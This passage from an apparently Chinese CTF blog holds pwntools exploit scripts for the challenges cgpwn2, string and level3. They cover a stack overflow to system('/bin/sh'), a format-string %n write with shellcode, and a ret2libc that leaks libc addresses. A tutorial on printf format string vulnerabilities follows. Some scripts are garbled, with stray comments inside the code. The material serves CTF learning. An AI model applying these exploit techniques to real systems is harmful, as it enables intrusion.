payload)<br>r.interactive()<br></code></pre></div></td></tr></table></figure><h2 id="9-cgpwn2"><a href="#9-cgpwn2" class="headerlink" title="9 cgpwn2"></a>9 cgpwn2</h2><h3 id="9-1-checksec"><a href="#9-1-checksec" class="headerlink" title="9.1 checksec"></a>9.1 checksec</h3><p><img src="https://i.loli.net/2021/07/19/dOLQ8A5XaRMDF47.png" alt="20"></p><h3 id="8-2-找漏洞-1"><a href="#8-2-找漏洞-1" class="headerlink" title="8.2 找漏洞"></a>8.2 找漏洞</h3><p><img src="https://i.loli.net/2021/07/19/KJQpnbUuq5aoPOl.png" alt="21"></p><p>溢出点肯定就是gets函数啦。偏移值0x2A。<br>但是我们需要自己构造system函数的参数，只要把name的值改成那个值就行了。</p><h3 id="9-3-脚本"><a href="#9-3-脚本" class="headerlink" title="9.3 脚本"></a>9.3 脚本</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>payload = <span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">0x2A</span>(<span class="hljs-string">&#x27;捏妈的,0x26+0x4能给我算成0x30来?&#x27;</span>) + p32(<span class="hljs-number">0x8048420</span>) + <span class="hljs-string">&#x27;AAAA&#x27;</span>-&gt;sys返回地址<span class="hljs-string">&#x27; + p32(0x804A080)&#x27;</span>name的地址<span class="hljs-string">&#x27;</span><br><span class="hljs-string">r = process(&#x27;</span>./cgpwn2<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">r.sendlineafter(&#x27;</span>name\n<span class="hljs-string">&#x27;,&#x27;</span>/<span class="hljs-built_in">bin</span>/sh<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">r.sendlineafter(&#x27;</span>here:\n<span class="hljs-string">&#x27;,payload)</span><br><span class="hljs-string">r.interactive()</span><br></code></pre></div></td></tr></table></figure><h2 id="10-string"><a href="#10-string" class="headerlink" title="10 string"></a>10 string</h2><h3 id="10-1-checksec"><a href="#10-1-checksec" class="headerlink" title="10.1 checksec"></a>10.1 checksec</h3><p><img src="https://i.loli.net/2021/07/19/f6NWvTAL2tYuKkr.png" alt="22"></p><h3 id="10-2-找漏洞"><a href="#10-2-找漏洞" class="headerlink" title="10.2 找漏洞"></a>10.2 找漏洞</h3><p>代码好长啊。</p><img src="https://i.loli.net/2021/07/19/32uH7CzocNe4bKE.png" alt="23" style="zoom:80%;" /><p>看看func1。</p><img src="https://i.loli.net/2021/07/19/JI9wTKFP6li1gZV.png" alt="24" style="zoom: 80%;" /><p>func2。</p><img src="https://i.loli.net/2021/07/19/AscTUzQ9x1KXBR8.png" alt="25" style="zoom:80%;" /><p>没有溢出点。func3。</p><img src="https://i.loli.net/2021/07/19/3DxVSQvWNoB58ea.png" alt="26" style="zoom:80%;" /><p>好啦，溢出点。</p><p><img src="https://i.loli.net/2021/07/19/vAengmcpkH6dqK4.png" alt="27"></p><p>很明显，让a1数组的第0位和第1位相等（就是85和68）。</p><p>后面那个mmap是内存映射，意思就是填入一个机器码使得直接执行。</p><h3 id="10-3-脚本"><a href="#10-3-脚本" class="headerlink" title="10.3 脚本"></a>10.3 脚本</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>payload = <span class="hljs-string">&#x27;%68c%7$n&#x27;</span><span class="hljs-comment"># b&#x27;a&#x27;*85 + &#x27;%7$n&#x27;也是可以的</span><br>r = process(<span class="hljs-string">&#x27;./string&#x27;</span>)<br>r.recvuntil(<span class="hljs-string">&#x27;secret[1] is &#x27;</span>)<br>a = <span class="hljs-built_in">int</span>(<span class="hljs-string">&#x27;0x&#x27;</span>+r.recvline(),base=<span class="hljs-number">16</span>)<br>r.sendlineafter(<span class="hljs-string">&#x27;name be:\n&#x27;</span>, <span class="hljs-string">&#x27;user&#x27;</span>)<br>r.sendlineafter(<span class="hljs-string">&#x27;up?:\n&#x27;</span>,<span class="hljs-string">&#x27;east&#x27;</span>)<br>r.sendlineafter(<span class="hljs-string">&#x27;leave(0)?:\n&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>r.sendlineafter(<span class="hljs-string">&quot;address&#x27;\n&quot;</span>,<span class="hljs-built_in">str</span>(a))<br>r.sendlineafter(<span class="hljs-string">&#x27;wish is:\n&#x27;</span>,payload)<br>r.sendlineafter(<span class="hljs-string">&#x27;SPELL\n&#x27;</span>,asm(shellcraft.amd64.sh(),arch=<span class="hljs-string">&quot;amd64&quot;</span>))<br><span class="hljs-comment">#当我们在获得程序的漏洞后，就可以在程序的漏洞处执行特定的代码，而这些代码也就是俗称的shellcode。</span><br><span class="hljs-comment">#获得执行system(“/bin/sh”)汇编代码所对应的机器码： asm(shellcraft.sh()) 。注意要指明arch和os。arch有</span><br><span class="hljs-comment">#i386(x86)和amd64(x64)。攻防世界的题解区有人说这个函数失效，其实是因为他没指明环境。不同环境下的汇编代</span><br><span class="hljs-comment">#码是不同的。</span><br>r.interactive()<br><br><span class="hljs-comment">#AAAA%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-</span><br></code></pre></div></td></tr></table></figure><h2 id="11-level3"><a href="#11-level3" class="headerlink" title="11 level3"></a>11 level3</h2><h3 id="11-1-checksec"><a href="#11-1-checksec" class="headerlink" title="11.1 checksec"></a>11.1 checksec</h3><p><img src="https://i.loli.net/2021/07/19/kwIAFZPTb5BuMfV.png" alt="28"></p><h3 id="11-2-找漏洞"><a href="#11-2-找漏洞" class="headerlink" title="11.2 找漏洞"></a>11.2 找漏洞</h3><p>开IDA看看，看到有一个read的栈溢出。</p><p><img src="https://i.loli.net/2021/07/19/4SCUlP8QLGINi7k.png" alt="29"></p><p>只有write和read函数，那只能通过泄露libc的基址来调用<code>system(&#39;/bin/sh&#39;)</code>了。</p><p>我们可以知道的有：write函数的plt表位置和got表位置。由于在read函数之前已经调用过write函数了，即已经完成了延迟绑定，那么got表中已经记录了write的地址，由于libc的函数偏移值是固定的，则可以获得libc的基址，并得到system函数的实际地址。</p><h3 id="11-3-脚本"><a href="#11-3-脚本" class="headerlink" title="11.3 脚本"></a>11.3 脚本</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>aaaa<br><br>context(os=<span class="hljs-string">&quot;linux&quot;</span>, arch=<span class="hljs-string">&quot;amd64&quot;</span>, log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br><br>DEBUG = <span class="hljs-number">0</span><br><br><span class="hljs-keyword">if</span> DEBUG == <span class="hljs-number">1</span>:<br>p = process(<span class="hljs-string">&#x27;./level3&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>p = remote(<span class="hljs-string">&quot;220.249.52.133&quot;</span>,<span class="hljs-number">56008</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./level3&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc_32.so.6&#x27;</span>)<br><br>write_plt = elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]<br>write_got = elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>main_addr = elf.symbols[<span class="hljs-string">&#x27;main&#x27;</span>]<br><br>payload = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">0x8c</span> + p32(write_plt)  + p32(main_addr) + p32(<span class="hljs-number">1</span>) + p32(write_got) + p32(<span class="hljs-number">4</span>)<br><span class="hljs-comment">#从这里跳转到write函数中,默认当前栈顶就是返回地址,下面的依次是参数1-n(先压参数再返回地址)</span><br>p.recvuntil(<span class="hljs-string">&#x27;Input:\n&#x27;</span>)<br>p.sendline(payload)<br>write_addr = u32(p.recv(<span class="hljs-number">4</span>))<span class="hljs-comment">#unpack() 这里是write函数输出的got</span><br><br><span class="hljs-comment">#print(hex(write_addr))</span><br>p.recvuntil(<span class="hljs-string">&#x27;Input:\n&#x27;</span>)<span class="hljs-comment">#重新进入main函数</span><br>write_libc = libc.symbols[<span class="hljs-string">&#x27;write&#x27;</span>]<br>system_addr = (write_addr - write_libc)<span class="hljs-string">&#x27;&#x27;&#x27;这玩意儿是基址&#x27;&#x27;&#x27;</span> + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh_addr = (write_addr - write_libc) + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))<br>payload = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">0x8c</span> + p32(system_addr) + p32(main_addr) + p32(binsh_addr) <br>p.sendline(payload)<br>p.interactive()<br></code></pre></div></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>p = remote(<span class="hljs-string">&#x27;111.200.241.244&#x27;</span>, <span class="hljs-number">63933</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./level3&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc_32.so.6&#x27;</span>)<br><br>write_plt = elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]<br>write_got = elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>main_addr = elf.symbols[<span class="hljs-string">&#x27;main&#x27;</span>]<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x88</span>+<span class="hljs-number">0x4</span>) + p32(write_plt) + p32(main_addr) + p32(<span class="hljs-number">1</span>) + p32(write_got) + p32(<span class="hljs-number">4</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;:\n&#x27;</span>, payload)<br>write_addr = u32(p.recv(<span class="hljs-number">4</span>))<br><br>write_libc = libc.symbols[<span class="hljs-string">&#x27;write&#x27;</span>]<br>sys_addr = write_addr - write_libc + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>sh_addr = write_addr - write_libc + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x88</span>+<span class="hljs-number">0x4</span>) + p32(sys_addr) + <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">4</span> + sh_addr<br>p.sendlineafter(<span class="hljs-string">&#x27;:\n&#x27;</span>, payload)<br>p.interactive()<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>PWN</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pwn题:格式化输出字符串漏洞</title>
    <link href="/2021-07/pwn-ctf-pwn1/"/>
    <url>/2021-07/pwn-ctf-pwn1/</url>
    
    <content type="html"><![CDATA[<h1 id="pwn：格式化字符串漏洞"><a href="#pwn：格式化字符串漏洞" class="headerlink" title="pwn：格式化字符串漏洞"></a>pwn：格式化字符串漏洞</h1><p>CTF——PWN的基础漏洞类型。 </p><h2 id="1-printf函数的格式化字符串漏洞"><a href="#1-printf函数的格式化字符串漏洞" class="headerlink" title="1 printf函数的格式化字符串漏洞"></a>1 printf函数的格式化字符串漏洞</h2><h3 id="1-1-printf函数"><a href="#1-1-printf函数" class="headerlink" title="1.1 printf函数"></a>1.1 printf函数</h3><p>printf()函数是格式化输出函数, 一般用于向准则输出设备按规定式样输出消息。<br>函数的原型为：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">printf</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *format, ...)</span></span>;<br></code></pre></div></td></tr></table></figure><p>printf()函数的调用格式为:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;&lt;格式化字符串&gt;&quot;</span>, &lt;参量表&gt;);<br></code></pre></div></td></tr></table></figure><p>其中格式化字符串包括两部分内容: 一部分是正常字符, 这些字符将按原样输出; 另一部分是格式化规定字符, 以”%”开始, 后跟一个或几个规定字符,用来确定输出内容格式。参量表是需要输出的一系列参数, 其个数必须与格式化字符串所说明的输出参数个数一样多, 各参数之间用”,”分开, 且顺序一一对应, 否则将会出现意想不到的错误。</p><p>printf()函数的大家族：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">printf</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *format, ...)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">fprintf</span><span class="hljs-params">(FILE *stream, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *format, ...)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">dprintf</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *format, ...)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sprintf</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *str, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *format, ...)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">snprintf</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *str, <span class="hljs-keyword">size_t</span> size, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *format, ...)</span></span>;<br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdarg.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">vprintf</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *format, va_list ap)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">vfprintf</span><span class="hljs-params">(FILE *stream, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *format, va_list ap)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">vdprintf</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *format, va_list ap)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">vsprintf</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *str, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *format, va_list ap)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">vsnprintf</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *str, <span class="hljs-keyword">size_t</span> size, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *format, va_lis t ap)</span></span>;<br></code></pre></div></td></tr></table></figure><ul><li>fprintf()按照格式字符串的内容将输出写入流中。三个参数为流、格式字符串和变参列表。</li><li>printf()等同于fprintf()，但是它假定输出流为stdout。 </li><li>sprintf()等同于fprintf()，但是输出不是写入流而是写入数组。在写入的字符串末尾必须添加一个空字符。</li><li>snprintf()等同于sprintf()，但是它指定了可写入字符的最大值size。当size大于零时，输出字符超过第size-1的部分会被舍弃而 不会写入数组中，在写入数组的字符串末尾会添加一个空字符。</li><li>dprintf()等同于fprintf()，但是它输出不是流而是一个文件描述符fd 。</li><li>vfprintf()、vprintf()、vsprintf()、vsnprintf()、vdprintf()分别与上面的函数对应，只是它们将变参列表换成了va_list类型的参数。</li></ul><h3 id="1-2-格式字符串format"><a href="#1-2-格式字符串format" class="headerlink" title="1.2 格式字符串format"></a>1.2 格式字符串format</h3><p>格式字符串是由普通字符（ordinary character，包括 % ）和转换规则（conversion specification）构成的字符序列。普通字符被原封不动地复制到输出流中。转换规则根据与实参对应的转换指示符对其进行转换，然后将结果写入输出流中。<br>一个转换规则有可选部分和必需部分组成：</p><div class="hljs code-wrapper"><pre><code>%[ 参数 ][ 标志 ][ 宽度 ][ .精度 ][ 长度 ] 转换指示符</code></pre></div><ul><li>（必需）转换指示符：</li></ul><table><thead><tr><th>字符</th><th align="left">描述</th></tr></thead><tbody><tr><td>d,i</td><td align="left">有符号十进制数值<code>int</code>。<code>%d</code> 与<code>%i </code>对于输出是同义；但对于<code>scanf()</code>输入二者不同，其中<code>%i</code>在输入值有前缀<code>0x</code>或<code>0</code>时，分别表示16进制或8进制的值。如果指定了精度，则输出的数字不足时在左侧补0。默认精度为1。精度为0且值为0，则输出为空。</td></tr><tr><td>u</td><td align="left">十进制<code>unsigned int</code>。如果指定了精度，则输出的数字不足时在左侧补0。默认精度为1。精度为0且值为0，则输出为空。</td></tr><tr><td>f,F</td><td align="left"><code>double</code>型输出10进制定点表示。<code>f </code>与 <code>F</code> 差异是表示无穷与NaN时，<code>f</code>输出<code>inf</code>, <code>infinity</code>与 <code>nan</code>；<code>F</code> 输出<code>INF</code>, <code>INFINITY</code>与<code>NAN</code>。小数点后的数字位数等于精度，最后一位数字四舍五入。精度默认为6。如果精度为0且没有#标记，则不出现小数点。小数点左侧至少一位数字。</td></tr><tr><td>e,E</td><td align="left"><code>double</code>值，输出形式为10进制的<code>([ - ]d.ddd e [ + / - ]ddd)</code>. E版本使用的指数符号为<code>E</code>（而不是<code>e</code>）。指数部分至少包含2位数字，如果值为0，则指数部分为00。Windows系统，指数部分至少为3位数字，例如1.5e002，也可用Microsoft版的运行时函数<code>_set_output_format</code>修改。小数点前存在1位数字。小数点后的数字位数等于精度。精度默认为6。如果精度为0且没有#标记，则不出现小数点。</td></tr><tr><td>g,G</td><td align="left"><code>double</code>型数值，精度定义为全部有效数字位数。当指数部分在闭区间 [-4,精度] 内，输出为定点形式；否则输出为指数浮点形式。<code>g</code>使用小写字母，<code>G</code>使用大写字母。小数点右侧的尾数0不被显示；显示小数点仅当输出的小数部分不为0。</td></tr><tr><td>x,X</td><td align="left">16进制<code>unsigned int</code>。<code>x</code>使用小写字母；<code>X</code>使用大写字母。如果指定了精度，则输出的数字不足时在左侧补0。默认精度为1。精度为0且值为0，则输出为空。</td></tr><tr><td>o</td><td align="left">8进制<code>unsigned int</code>。如果指定了精度，则输出的数字不足时在左侧补0。默认精度为1。精度为0且值为0，则输出为空。</td></tr><tr><td>s</td><td align="left">如果没有用<code>l</code>标志，输出<code>null</code>结尾字符串直到精度规定的上限；如果没有指定精度，则输出所有字节。如果用了<code>l</code>标志，则对应函数参数指向<code>wchar_t</code>型的数组，输出时把每个宽字符转化为多字节字符，相当于调用<code>wcrtomb</code> 函数。</td></tr><tr><td>c</td><td align="left">如果没有用<code>l</code>标志，把<code>int</code>参数转为<code>unsigned char</code>型输出；如果用了<code>l</code>标志，把<code>wint_t</code>参数转为包含两个元素的 <code>chart_t</code>数组，其中第一个元素包含要输出的字符，第二个元素为<code>null</code>宽字符。</td></tr><tr><td>p</td><td align="left">void*型，输出对应变量的值。 <code>printf(&quot;%p&quot;, a)</code>用地址的格式打印变量a的值， printf(“%p”, &amp;a) 打印变量a所在的地址。</td></tr><tr><td>a,A</td><td align="left">double<code>型的16进制表示，</code>[−]0xh.hhhh p±d<code>。其中指数部分为10进制表示的形式。例如：1025.010输出为0x1.004000p+10。</code>a<code>使用小写字母，</code>A`使用大写字母。</td></tr><tr><td>n</td><td align="left">不输出字符，但是把已经成功输出的字符个数写入对应的<strong>整型指针参数</strong>所指的变量。</td></tr><tr><td>%</td><td align="left"><code>% </code>字面值，不接受任何除了<code>参数</code>以外的部分。</td></tr></tbody></table><ul><li>（可选）参数 </li></ul><table><thead><tr><th>字符</th><th>描述</th></tr></thead><tbody><tr><td><code>n$</code></td><td><code>n</code>是用这个格式说明符显示第几个参数；这使得参数可以输出多次，使用多个格式说明符，以不同的顺序输出。如果任意一个占位符使用了参数 ，则其他所有占位符必须也使用参数 。例：<code>printf(&quot;%2$d %2$#x; %1$d %1$#x&quot;,16,17)</code> 产生<code>17 0x11; 16 0x10</code></td></tr></tbody></table><p>剩下的略（有用再填）。</p><h3 id="1-3-在pwn中的应用"><a href="#1-3-在pwn中的应用" class="headerlink" title="1.3 在pwn中的应用"></a>1.3 在pwn中的应用</h3><p>看上去好像说，<code>printf</code>这个类型的函数只能输出啊。然而实际上，他有一个有趣的转换指示符，那就是：</p><p><code>%n</code>：不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。</p><p>我们测试一下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-comment">//printfn.c</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-keyword">int</span> a;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>a = <span class="hljs-number">1</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;a = %d\n&quot;</span>,a);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;1234567890%n\n&quot;</span>,&amp;a);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;a = %d\n&quot;</span>,a);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>运行结果：</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> gcc printfn.c -o printfn</span><br><span class="hljs-meta">$</span><span class="bash"> ./printfn</span> <br>a = 1<br>1234567890<br>a = 10<br><span class="hljs-meta">$</span><span class="bash"> </span><br></code></pre></div></td></tr></table></figure><p>你看，仅用标准输出语句就成功改写了a的值！</p><p>说到这里已经很清楚了，我们可以通过修改<strong>参数</strong>的值，来改写<strong>该值所对应的地址的值</strong>，使程序执行发生错误。</p><p>比如以下代码：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-comment">//pwnit.c</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-keyword">char</span> buf[<span class="hljs-number">80</span>];<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-keyword">int</span> a = <span class="hljs-number">5</span>;<br>    <span class="hljs-keyword">int</span> *p = &amp;a;<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>,buf);<br><span class="hljs-built_in">printf</span>(buf);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n%x\n&quot;</span>,a);<br><span class="hljs-keyword">if</span>(a == <span class="hljs-number">0x10</span>) &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;you pwn me!\n&quot;</span>);<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>我们编译运行一下：</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> gcc pwnit.c -m32 -o pwnit</span><br>pwnit.c: In function ‘main’:<br>pwnit.c:8:9: warning: format not a string literal and no format arguments [-Wformat-security]<br>  printf(buf);<br>         ^<br><span class="hljs-meta">$</span><span class="bash"> ./pwnit</span> <br>abcde<br>abcde<br>5<br><span class="hljs-meta">$</span><span class="bash"> </span><br></code></pre></div></td></tr></table></figure><p>输入abcde似乎根本没用哦。。但是我们可以输入一个字符串看看，<code>int a = 5</code>这个变量声明在哪：</p><p>输入字符串：aaaa-%p-%p-%p-%p-%p-%p-%p-%p</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ./pwnit</span><br><span class="hljs-meta">aaaa-%</span><span class="bash">p-%p-%p-%p-%p-%p-%p-%p-%p</span><br>aaaa-0x804a060-0xf75bca60-0x80485db-0x1-0x5-0xfff84494-0x4f3eea00-0xf77413dc-0xfff844c0<br>5<br><span class="hljs-meta">$</span><span class="bash"> </span><br></code></pre></div></td></tr></table></figure><p>这个方法的重点在于：<strong>printf函数的参数是先被压入栈中后获取栈中的值或者地址作为参数的！</strong>当初没有想明白这个问题，困惑了好久。所以，我们发现，第5个参数的值是0x5，说明我们只要把第6个参数<code>（int* p）</code>改成0x10就可以了！</p><p>输入字符串：aaaaaaaaaaaaaaaa%6$n</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ./pwnit</span><br><span 